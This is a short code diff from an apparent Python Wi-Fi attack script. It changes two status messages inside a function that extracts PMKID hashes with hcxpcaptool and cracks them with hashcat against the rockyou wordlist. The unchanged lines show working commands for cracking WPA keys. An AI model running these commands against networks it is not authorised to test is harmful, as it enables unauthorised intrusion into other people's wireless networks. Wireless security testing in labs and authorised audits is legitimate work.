@@ -112,7 +112,7 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["clear"])
         get_pkmid_hashes = subprocess.run(["sudo", "hcxpcaptool", "-z", "myHashes_PKMID", "Capture_PKMID"], capture_output=True, text=True)
         subprocess.run(["clear"])
-        get_colours("\nGetting hashes", "magenta")
+        get_colours("\nTrying getting hashes", "magenta")
         subprocess.run(["rm", "Capture_PKMID"])
         if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
             get_colours("\nStarting with Brute-Force attack..", "cyan")
@@ -120,7 +120,7 @@ def attack_func(network_interface, attack_mode):
             get_colours("", "yellow")
             subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID", "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
         else:
-            get_colours("\nNo packet capture..", "red")
+            get_colours("\nno packet captured...", "red")
 
 
 def ctrl_c(signum, frame):
